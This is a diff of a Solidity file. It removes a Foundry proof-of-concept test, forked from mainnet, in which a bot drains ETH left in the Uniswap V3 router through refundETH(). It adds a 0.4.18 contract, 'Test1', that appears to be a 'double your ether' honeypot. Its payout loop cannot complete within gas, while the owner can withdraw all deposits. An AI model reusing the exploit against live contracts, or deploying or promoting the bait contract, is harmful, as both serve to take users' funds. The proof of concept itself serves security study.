@@ -1,103 +1,40 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.18;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.4.18;
 
-import "forge-std/Test.sol";
-// this excersise is specific UniSwapV3 ETH refund issue
-// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc
-// @article:
+contract Test1
+{
+    address owner = msg.sender;
 
-struct ExactInputSingleParams {
-    address tokenIn;
-    address tokenOut;
-    uint24 fee;
-    address recipient;
-    uint256 deadline;
-    uint256 amountIn;
-    uint256 amountOutMinimum;
-    uint160 sqrtPriceLimitX96;
-}
+    function withdraw()
+    payable
+    public
+    {
+        require(msg.sender==owner);
+        owner.transfer(this.balance);
+    }
 
-interface ISwapRouter {
-    function exactInputSingle(
-        ExactInputSingleParams calldata params
-    ) external payable returns (uint256 amountOut);
+    function() payable {}
 
-    function refundETH() external payable;
-}
+    function Test()
+    payable
+    public
+    {
+        if(msg.value>=1 ether)
+        {
 
-interface IPool {
-    function slot0()
-        external
-        view
-        returns (
-            uint160 sqrtPriceX96,
-            int24 tick,
-            uint16 observationIndex,
-            uint16 observationCardinality,
-            uint16 observationCardinalityNext,
-            uint8 feeProtocol,
-            bool unlocked
-        );
-}
+            var i1 = 1;
+            var i2 = 0;
+            var amX2 = msg.value*2;
 
-interface IERC20 {
-    function balanceOf(address) external view returns (uint256);
-}
+            while(true)
+            {
+                if(i1<i2)break;
+                if(i1>amX2)break;
 
-interface IWETH9 {
-    function approve(address guy, uint256 wad) external returns (bool);
-}
-
-contract UniswapV3ETHRefundOperationTest is Test {
-    ISwapRouter router =
-        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
-
-    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
-
-    function testOperation() public {
-        vm.createSelectFork("mainnet", 16454867);
-
-        uint256 amountIn = 100 ether;
-
-        vm.label(address(this), "user");
-        vm.deal(address(this), amountIn);
-
-        // Users sells 100 ETH to buy USDC. They have a limit price set.
-        ExactInputSingleParams memory params = ExactInputSingleParams({
-            tokenIn: weth,
-            tokenOut: usdc,
-            fee: 500,
-            recipient: address(this),
-            deadline: block.timestamp,
-            amountIn: amountIn,
-            amountOutMinimum: 0,
-            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2
-        });
-
-        // Full input amount is sent along the call.
-        router.exactInputSingle{value: amountIn}(params);
-
-        // User has bought some USDC. However, the full input ETH amount wasn't used...
-        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);
-
-        // ... the remaining ETH is still in the Router contract.
-        uint256 routerBeforeBalance = address(router).balance;
-        assertEq(routerBeforeBalance, 50 ether);
-
-        // A MEV bot transfers the remaining ETH by calling the public refundETH function.
-        address mev = address(0x31337);
-        vm.label(mev, "mev");
-
-        vm.prank(mev);
-        router.refundETH();
-        assertEq(address(mev).balance, 50 ether);
-        uint256 routerAfterBalance = address(router).balance;
-        assertEq(routerAfterBalance, 0 ether);
-        console.log(
-            "router loss ether amount:",
-            routerBeforeBalance - routerAfterBalance
-        );
+                i2=i1;
+                i1++;
+            }
+            msg.sender.transfer(i2);
+        }
     }
 }
